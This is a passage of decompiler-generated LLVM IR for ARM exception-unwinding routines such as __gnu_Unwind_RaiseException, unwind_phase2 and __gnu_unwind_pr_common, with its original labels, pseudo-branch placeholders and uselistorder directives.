  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_18150, { 1, 0 }
  uselistorder label %dec_label_pc_180f4, { 1, 0 }
  uselistorder label %dec_label_pc_180f0, { 1, 0 }
  uselistorder label %dec_label_pc_180a0, { 1, 0 }
  uselistorder label %dec_label_pc_1808c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_18164 = add i32 %ucbp, 12
  %v3_18164 = inttoptr i32 %v2_18164 to i32*
  store i32 %stop_fn, i32* %v3_18164, align 4
  %v3_18168 = add i32 %ucbp, 24
  %v4_18168 = inttoptr i32 %v3_18168 to i32*
  store i32 %tmp, i32* %v4_18168, align 4
  %v1_1816c = add i32 %entry_vrs, 60
  %v2_1816c = inttoptr i32 %v1_1816c to i32*
  %v3_1816c = load i32, i32* %v2_1816c, align 4
  %v2_18174 = add i32 %entry_vrs, 64
  %v3_18174 = inttoptr i32 %v2_18174 to i32*
  store i32 %v3_1816c, i32* %v3_18174, align 4
  %v3_1817c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1817c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_181946 = add i32 %vrs, 64
  %v2_181947 = inttoptr i32 %v1_181946 to i32*
  %v3_181948 = load i32, i32* %v2_181947, align 4
  %v2_181989 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_181948)
  store i32 %v2_181989, i32* %r0.global-to-local, align 4
  %v2_1819c11 = icmp eq i32 %v2_181989, 0
  br i1 %v2_1819c11, label %dec_label_pc_181a4, label %dec_label_pc_181d4

dec_label_pc_181a4:                               ; preds = %entry, %dec_label_pc_181a4.dec_label_pc_18190_crit_edge
  %v0_181a4 = load i32, i32* @r5, align 4
  %v1_181a4 = add i32 %v0_181a4, 64
  %v2_181a4 = inttoptr i32 %v1_181a4 to i32*
  %v3_181a4 = load i32, i32* %v2_181a4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_181ac = load i32, i32* @r4, align 4
  %v2_181ac = add i32 %v1_181ac, 20
  %v3_181ac = inttoptr i32 %v2_181ac to i32*
  store i32 %v3_181a4, i32* %v3_181ac, align 4
  %v0_181b0 = load i32, i32* @r4, align 4
  %v1_181b8 = add i32 %v0_181b0, 16
  %v2_181b8 = inttoptr i32 %v1_181b8 to i32*
  %v3_181b8 = load i32, i32* %v2_181b8, align 4
  call void @__pseudo_branch(i32 %v3_181b8)
  %v0_181c4 = load i32, i32* %r0.global-to-local, align 4
  %v7_181c4 = icmp eq i32 %v0_181c4, 8
  br i1 %v7_181c4, label %dec_label_pc_181a4.dec_label_pc_18190_crit_edge, label %dec_label_pc_181cc

dec_label_pc_181a4.dec_label_pc_18190_crit_edge:  ; preds = %dec_label_pc_181a4
  %v0_18190.pre = load i32, i32* @r4, align 4
  %v0_18194.pre = load i32, i32* @r5, align 4
  store i32 %v0_18190.pre, i32* %r0.global-to-local, align 4
  %v1_18194 = add i32 %v0_18194.pre, 64
  %v2_18194 = inttoptr i32 %v1_18194 to i32*
  %v3_18194 = load i32, i32* %v2_18194, align 4
  %v2_18198 = call i32 @get_eit_entry(i32 %v0_18190.pre, i32 %v3_18194)
  store i32 %v2_18198, i32* %r0.global-to-local, align 4
  %v2_1819c = icmp eq i32 %v2_18198, 0
  br i1 %v2_1819c, label %dec_label_pc_181a4, label %dec_label_pc_181d4

dec_label_pc_181cc:                               ; preds = %dec_label_pc_181a4
  %v7_181cc = icmp eq i32 %v0_181c4, 7
  br i1 %v7_181cc, label %dec_label_pc_181d8, label %dec_label_pc_181d4

dec_label_pc_181d4:                               ; preds = %entry, %dec_label_pc_181a4.dec_label_pc_18190_crit_edge, %dec_label_pc_181cc
  %v0_181d4 = call i32 @abort()
  store i32 %v0_181d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181d8

dec_label_pc_181d8:                               ; preds = %dec_label_pc_181cc, %dec_label_pc_181d4
  %v0_181d8 = load i32, i32* @r5, align 4
  %v1_181d8 = add i32 %v0_181d8, 4
  store i32 %v1_181d8, i32* %r0.global-to-local, align 4
  %v1_181dc = inttoptr i32 %v1_181d8 to i32*
  %v2_181dc = call i32 @__restore_core_regs(i32* %v1_181dc)
  store i32 %v2_181dc, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_181d8, { 1, 0 }
  uselistorder label %dec_label_pc_181d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_181a4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_181e0 = add i32 %ucbp, 20
  %v2_181e0 = inttoptr i32 %v1_181e0 to i32*
  %v3_181e0 = load i32, i32* %v2_181e0, align 4
  %v1_181e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_181e8 = add i32 %v1_181e8, 64
  %v3_181e8 = inttoptr i32 %v2_181e8 to i32*
  store i32 %v3_181e0, i32* %v3_181e8, align 4
  %v1_181ec = add i32 %ucbp, 12
  %v2_181ec = inttoptr i32 %v1_181ec to i32*
  %v3_181ec = load i32, i32* %v2_181ec, align 4
  %v2_181f0 = icmp eq i32 %v3_181ec, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_181fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_181fc, i32* @r5, align 4
  br i1 %v2_181f0, label %dec_label_pc_18204, label %dec_label_pc_18240

dec_label_pc_18204:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18210 = add i32 %ucbp, 16
  %v2_18210 = inttoptr i32 %v1_18210 to i32*
  %v3_18210 = load i32, i32* %v2_18210, align 4
  call void @__pseudo_branch(i32 %v3_18210)
  br i1 false, label %dec_label_pc_18238, label %dec_label_pc_18224

dec_label_pc_18224:                               ; preds = %dec_label_pc_18204
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_12ff8.546 to i32))
  %v0_1822c = load i32, i32* @r4, align 4
  %v0_18230 = load i32, i32* @r5, align 4
  store i32 %v0_18230, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1822c, i32 %v0_18230)
  br label %dec_label_pc_18238

dec_label_pc_18238:                               ; preds = %dec_label_pc_18204, %dec_label_pc_18224
  %v0_18238 = load i32, i32* @r5, align 4
  %v1_18238 = add i32 %v0_18238, 4
  %v1_1823c = inttoptr i32 %v1_18238 to i32*
  %v2_1823c = call i32 @__restore_core_regs(i32* %v1_1823c)
  %v1_18244.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18240

dec_label_pc_18240:                               ; preds = %entry, %dec_label_pc_18238
  %v1_18244 = phi i32 [ %v0_181fc, %entry ], [ %v1_18244.pre, %dec_label_pc_18238 ]
  %v3_18244 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18244, i32 1)
  %v0_18248 = call i32 @abort()
  ret i32 %v0_18248

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 46, 48, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 29, 53, 57, 56, 55, 49, 50, 37, 38, 39, 40, 41, 51, 52, 54, 32, 33, 47, 30, 34, 31, 23, 24, 0, 25, 26, 27, 28, 35, 36, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 134, 4, 135, 136, 137, 138, 5, 80, 111, 139, 6, 79, 140, 7, 78, 141, 142, 143, 144, 8, 145, 112, 9, 82, 146, 10, 81, 147, 148, 11, 149, 150, 151, 12, 152, 153, 13, 154, 14, 114, 155, 156, 113, 157, 158, 15, 83, 16, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 18, 85, 19, 169, 170, 171, 20, 84, 172, 21, 17, 173, 174, 22, 175, 176, 177, 23, 178, 179, 180, 181, 182, 24, 25, 115, 26, 27, 28, 133, 86, 183, 184, 87, 185, 117, 186, 187, 30, 188, 189, 31, 88, 191, 29, 192, 190, 193, 116, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 90, 43, 44, 45, 46, 47, 212, 77, 91, 97, 198, 100, 99, 48, 194, 120, 195, 196, 51, 197, 89, 98, 199, 200, 201, 202, 92, 203, 204, 205, 206, 207, 52, 53, 208, 209, 49, 50, 210, 211, 119, 118, 54, 55, 56, 213, 57, 58, 101, 102, 107, 103, 108, 104, 106, 214, 105, 110, 215, 59, 216, 60, 217, 121, 122, 218, 123, 124, 219, 125, 126, 61, 62, 220, 127, 128, 63, 64, 221, 129, 130, 65, 66, 222, 131, 132, 67, 68, 96, 223, 224, 109, 225, 69, 93, 70, 71, 94, 72, 73, 74, 75, 76 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18240, { 1, 0 }
  uselistorder label %dec_label_pc_18238, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1824c = load i32, i32* @r4, align 4
  store i32 %v3_1824c, i32* %stack_var_-16, align 4
  %v6_1824c = load i32, i32* @r5, align 4
  %v9_1824c = load i32, i32* @r6, align 4
  %v12_1824c = load i32, i32* @lr, align 4
  %v1_18250 = add i32 %entry_vrs, 60
  %v2_18250 = inttoptr i32 %v1_18250 to i32*
  %v3_18250 = load i32, i32* %v2_18250, align 4
  %v2_18254 = add i32 %entry_vrs, 64
  %v3_18254 = inttoptr i32 %v2_18254 to i32*
  store i32 %v3_18250, i32* %v3_18254, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18284 = load i32, i32* %v3_18254, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1829c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18284)
  %v2_182a0 = icmp eq i32 %v2_1829c, 0
  br i1 %v2_182a0, label %dec_label_pc_182a8, label %dec_label_pc_182dc

dec_label_pc_182a8:                               ; preds = %entry
  %v0_182a8 = load i32, i32* @r5, align 4
  %v1_182b0 = add i32 %v0_182a8, 16
  %v2_182b0 = inttoptr i32 %v1_182b0 to i32*
  %v3_182b0 = load i32, i32* %v2_182b0, align 4
  call void @__pseudo_branch(i32 %v3_182b0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_182c8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_182cc = urem i32 %v2_182c8, 2
  %v2_182cc = icmp eq i32 %v1_182cc, 0
  br i1 %v2_182cc, label %dec_label_pc_182ec, label %dec_label_pc_182d4

dec_label_pc_182d4:                               ; preds = %dec_label_pc_182a8, %dec_label_pc_182ec
  %v0_182d4 = phi i1 [ false, %dec_label_pc_182a8 ], [ %phitmp, %dec_label_pc_182ec ]
  br i1 %v0_182d4, label %dec_label_pc_182f8, label %dec_label_pc_182dc

dec_label_pc_182dc:                               ; preds = %entry, %dec_label_pc_182d4
  %v2_182e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_182e4, i32* @r4, align 4
  store i32 %v6_1824c, i32* @r5, align 4
  store i32 %v9_1824c, i32* @r6, align 4
  store i32 %v12_1824c, i32* @lr, align 4
  ret i32 9

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182a8
  %v2_182ec = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_182ec, i32* @r0, align 4
  %v1_182f0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_182ec)
  %v0_182d4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_182d4.pre, 6
  br label %dec_label_pc_182d4

dec_label_pc_182f8:                               ; preds = %dec_label_pc_182d4
  %v0_182f8 = load i32, i32* @r5, align 4
  %v0_182fc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_182f8, i32 %v0_182fc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_182dc, { 1, 0 }
  uselistorder label %dec_label_pc_182d4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18304 = add i32 %ucbp, 12
  %v2_18304 = inttoptr i32 %v1_18304 to i32*
  %v3_18304 = load i32, i32* %v2_18304, align 4
  %v2_18308 = icmp eq i32 %v3_18304, 0
  br i1 %v2_18308, label %dec_label_pc_18310, label %dec_label_pc_18314

dec_label_pc_18310:                               ; preds = %entry
  %v2_18310 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %entry, %dec_label_pc_18310
  %v1_18314 = add i32 %entry_vrs, 60
  %v2_18314 = inttoptr i32 %v1_18314 to i32*
  %v3_18314 = load i32, i32* %v2_18314, align 4
  %v2_1831c = add i32 %entry_vrs, 64
  %v3_1831c = inttoptr i32 %v2_1831c to i32*
  store i32 %v3_18314, i32* %v3_1831c, align 4
  %v3_18320 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18320

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18314, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18380

bb:                                               ; preds = %entry
  %v7_18338 = mul i32 %regclass, 4
  %v8_18338 = add i32 %v7_18338, ptrtoint (i32* @global_var_18340.697 to i32)
  call void @__pseudo_branch(i32 %v8_18338)
  br label %dec_label_pc_18380

dec_label_pc_18380:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18468 = load i32, i32* @r4, align 4
  %v6_18468 = load i32, i32* @r5, align 4
  %v2_18478 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18480 = add i32 %ucbp, 76
  %v2_18480 = inttoptr i32 %v1_18480 to i32*
  %v3_18480 = load i32, i32* %v2_18480, align 4
  %v1_1848c = inttoptr i32 %v3_18480 to i32*
  %v2_1848c = load i32, i32* %v1_1848c, align 4
  store i32 %v2_1848c, i32* @lr, align 4
  %v4_1848c = add i32 %v3_18480, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18498 = urem i32 %state, 4
  store i32 %v1_18498, i32* %r2.global-to-local, align 4
  %v1_1849c = and i32 %state, 8
  store i32 %v1_1849c, i32* %r0.global-to-local, align 4
  %v4_184ac = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1848c, i32* %v4_184ac, align 8
  br i1 %v2_18478, label %dec_label_pc_184bc, label %dec_label_pc_18798

dec_label_pc_184bc:                               ; preds = %entry
  %v3_184bc = mul i32 %v2_1848c, 256
  store i32 %v3_184bc, i32* %v4_184ac, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_184d4

dec_label_pc_184d4:                               ; preds = %dec_label_pc_18798, %dec_label_pc_184bc
  %v0_184f8647090 = phi i32 [ %v2_187b0, %dec_label_pc_18798 ], [ %v4_1848c, %dec_label_pc_184bc ]
  store i32 %v1_18498, i32* %r2.global-to-local, align 4
  %v1_184d8 = add i32 %ucbp, 80
  %v2_184d8 = inttoptr i32 %v1_184d8 to i32*
  %v3_184d8 = load i32, i32* %v2_184d8, align 4
  %v7_184dc = icmp eq i32 %v1_18498, 2
  br i1 %v7_184dc, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_184d4
  %v2_184e0 = add i32 %ucbp, 56
  %v3_184e0 = inttoptr i32 %v2_184e0 to i32*
  %v4_184e0 = load i32, i32* %v3_184e0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_184d4, %bb
  %v0_184f86470 = phi i32 [ %v0_184f8647090, %dec_label_pc_184d4 ], [ %v4_184e0, %bb ]
  %v1_184e4 = urem i32 %v3_184d8, 2
  %v2_184e4 = icmp eq i32 %v1_184e4, 0
  br i1 %v2_184e4, label %dec_label_pc_184f8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_185b8

dec_label_pc_184f8.preheader:                     ; preds = %bb148
  %v1_184f86571 = inttoptr i32 %v0_184f86470 to i32*
  %v2_184f86672 = load i32, i32* %v1_184f86571, align 4
  %v2_184fc6874 = icmp eq i32 %v2_184f86672, 0
  br i1 %v2_184fc6874, label %dec_label_pc_185b8, label %dec_label_pc_18504.preheader.lr.ph.lr.ph

dec_label_pc_18504.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_184f8.preheader
  %v7_18508 = icmp eq i32 %id, 2
  %v2_18594 = icmp eq i32 %v1_18498, 0
  %v2_18760 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1867c = icmp eq i32 %v1_1849c, 0
  br label %dec_label_pc_18504.preheader.lr.ph

dec_label_pc_18504.preheader.lr.ph:               ; preds = %dec_label_pc_18504.preheader.lr.ph.lr.ph, %dec_label_pc_187cc
  %v1_1851496 = phi i32 [ %v2_184f86672, %dec_label_pc_18504.preheader.lr.ph.lr.ph ], [ %v2_184f866, %dec_label_pc_187cc ]
  %v1_1851093 = phi i32 [ %v0_184f86470, %dec_label_pc_18504.preheader.lr.ph.lr.ph ], [ %v2_187d0, %dec_label_pc_187cc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18504.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_187cc ]
  br label %dec_label_pc_18504.preheader

dec_label_pc_18504.preheader:                     ; preds = %dec_label_pc_18504.preheader.lr.ph, %dec_label_pc_18790
  %v1_1851495 = phi i32 [ %v1_1851496, %dec_label_pc_18504.preheader.lr.ph ], [ %v2_184f8, %dec_label_pc_18790 ]
  %v1_1851092 = phi i32 [ %v1_1851093, %dec_label_pc_18504.preheader.lr.ph ], [ %v1_18790, %dec_label_pc_18790 ]
  br label %dec_label_pc_18504

dec_label_pc_18504:                               ; preds = %dec_label_pc_18504.preheader, %dec_label_pc_185a8
  %v1_18514 = phi i32 [ %v1_1851495, %dec_label_pc_18504.preheader ], [ %v2_185ac, %dec_label_pc_185a8 ]
  %v1_18528 = phi i32 [ %v1_1851092, %dec_label_pc_18504.preheader ], [ %v1_185a8, %dec_label_pc_185a8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18508, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18504
  %v2_1850c = add i32 %v1_18528, 4
  %v3_1850c = inttoptr i32 %v2_1850c to i32*
  %v4_1850c = load i32, i32* %v3_1850c, align 4
  store i32 %v4_1850c, i32* @r5, align 4
  store i32 %v1_18514, i32* @r6, align 4
  %v0_18518109 = load i32, i32* @r8, align 4
  %v1_18518110 = add i32 %v0_18518109, 72
  %v2_18518111 = inttoptr i32 %v1_18518110 to i32*
  %v3_18518112 = load i32, i32* %v2_18518111, align 4
  store i32 %v3_18518112, i32* @lr, align 4
  %v2_18524 = add i32 %v1_18528, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18504
  %v2_18510 = add i32 %v1_18528, 2
  %v3_18510 = inttoptr i32 %v2_18510 to i16*
  %v4_18510 = load i16, i16* %v3_18510, align 2
  %v5_18510 = zext i16 %v4_18510 to i32
  store i32 %v5_18510, i32* @r5, align 4
  %v0_18518 = load i32, i32* @r8, align 4
  %v1_18518 = add i32 %v0_18518, 72
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  store i32 %v3_18518, i32* @lr, align 4
  %v2_18520 = inttoptr i32 %v1_18528 to i16*
  %v3_18520 = load i16, i16* %v2_18520, align 2
  %v4_18520 = zext i16 %v3_18520 to i32
  store i32 %v4_18520, i32* @r6, align 4
  %v2_18528 = add i32 %v1_18528, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18528, %.thread16 ], [ %v2_18524, %bb151 ]
  %v3_18518115 = phi i32 [ %v3_18518, %.thread16 ], [ %v3_18518112, %bb151 ]
  %v0_18530113 = phi i32 [ %v5_18510, %.thread16 ], [ %v4_1850c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18530 = and i32 %v0_18530113, -2
  %v2_18534 = add i32 %v1_18530, %v3_18518115
  store i32 %v2_18534, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18544 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18544, i32* %r0.global-to-local, align 4
  %v5_18550 = call i32 @_Unwind_VRS_Get(i32 %v0_18544, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18550, i32* %r0.global-to-local, align 4
  %v3_18554 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18554, i32* %r2.global-to-local, align 4
  %v0_18558 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18558, %v3_18554
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18564

._crit_edge:                                      ; preds = %bb152
  %v0_1857c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18564:                               ; preds = %bb152
  %v0_18564 = load i32, i32* @r6, align 4
  %v1_18564 = and i32 %v0_18564, -2
  %v2_18568 = add i32 %v1_18564, %v0_18558
  %v3_1856c = icmp ult i32 %v3_18554, %v2_18568
  br i1 %v3_1856c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18564
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18564
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1857c = phi i32 [ %v0_1857c.pre, %._crit_edge ], [ %v0_18564, %bb153 ], [ %v0_18564, %.thread20 ]
  %v0_18724 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18578 = load i32, i32* @r5, align 4
  %v1_1857c = urem i32 %v0_1857c, 2
  %v1_18578 = mul i32 %v0_18578, 2
  %v3_18580 = and i32 %v1_18578, 2
  %v4_18580 = or i32 %v3_18580, %v1_1857c
  store i32 %v4_18580, i32* %r2.global-to-local, align 4
  %v7_18584 = icmp eq i32 %v4_18580, 1
  br i1 %v7_18584, label %dec_label_pc_18718, label %dec_label_pc_1858c

dec_label_pc_1858c:                               ; preds = %bb154
  %v2_18584 = icmp eq i32 %v4_18580, 0
  br i1 %v2_18584, label %dec_label_pc_18590, label %dec_label_pc_18640

dec_label_pc_18590:                               ; preds = %dec_label_pc_1858c
  store i32 %v1_18498, i32* %r2.global-to-local, align 4
  br i1 %v2_18594, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18590
  %v0_185a8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_185a8

bb155:                                            ; preds = %dec_label_pc_18590
  %v2_185a0 = icmp eq i32 %v0_18724, 0
  %v0_185a8 = load i32, i32* @r7, align 4
  br i1 %v2_185a0, label %dec_label_pc_185a8, label %dec_label_pc_18920

dec_label_pc_185a8:                               ; preds = %.thread, %bb155
  %v0_185a8120 = phi i32 [ %v0_185a8119, %.thread ], [ %v0_185a8, %bb155 ]
  %v1_185a8 = add i32 %v0_185a8120, 4
  %v1_185ac = inttoptr i32 %v1_185a8 to i32*
  %v2_185ac = load i32, i32* %v1_185ac, align 4
  %v2_185b0 = icmp eq i32 %v2_185ac, 0
  br i1 %v2_185b0, label %dec_label_pc_185b8, label %dec_label_pc_18504

dec_label_pc_185b8:                               ; preds = %dec_label_pc_187cc, %dec_label_pc_18790, %dec_label_pc_185a8, %dec_label_pc_184f8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_184f8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_185a8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18790 ], [ %stack_var_-76.4, %dec_label_pc_187cc ]
  %v0_185b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_185b8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_185c0 = call i32 @__gnu_unwind_execute(i32 %v0_185b8, %anon_struct_13* %tmp156)
  store i32 %v4_185c0, i32* %r0.global-to-local, align 4
  store i32 %v4_185c0, i32* %r5.global-to-local, align 4
  %v2_185c4 = icmp eq i32 %v4_185c0, 0
  br i1 %v2_185c4, label %dec_label_pc_185cc, label %dec_label_pc_18648

dec_label_pc_185cc:                               ; preds = %dec_label_pc_185b8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_185d0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_185d0, label %bb157, label %dec_label_pc_185dc

bb157:                                            ; preds = %dec_label_pc_185cc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1864c

dec_label_pc_185dc:                               ; preds = %dec_label_pc_185cc
  %v2_185dc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_185dc, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_185ec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_185ec, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_185f4 = call i32 @_Unwind_VRS_Get(i32 %v0_185ec, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_185f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_185ec, i32* %r0.global-to-local, align 4
  %v5_1860c = call i32 @_Unwind_VRS_Set(i32 %v0_185ec, i32 %v0_185f8, i32 14, i32 %v0_185f8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1860c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r2.global-to-local, align 4
  %v4_18618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 32) to i32*), align 4
  %v0_1861c = load i32, i32* %r5.global-to-local, align 4
  %v0_18620 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18620, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18618, i32* %stack_var_-48, align 4
  %v5_18634 = call i32 @_Unwind_VRS_Set(i32 %v0_18620, i32 %v0_1861c, i32 15, i32 %v0_1861c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1864c

dec_label_pc_18640:                               ; preds = %dec_label_pc_1858c
  %v7_18640 = icmp eq i32 %v4_18580, 2
  br i1 %v7_18640, label %dec_label_pc_18658, label %dec_label_pc_18648

dec_label_pc_18648:                               ; preds = %dec_label_pc_18640, %dec_label_pc_1872c, %dec_label_pc_185b8, %dec_label_pc_18920
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1864c

dec_label_pc_1864c:                               ; preds = %bb157, %dec_label_pc_18958, %dec_label_pc_188e8, %bb166, %dec_label_pc_185dc, %dec_label_pc_18648
  %v1_18654 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18958 ], [ %v1_18654.pre, %dec_label_pc_188e8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_185dc ], [ 9, %dec_label_pc_18648 ]
  store i32 %v3_18468, i32* %r4.global-to-local, align 4
  store i32 %v6_18468, i32* %r5.global-to-local, align 4
  ret i32 %v1_18654

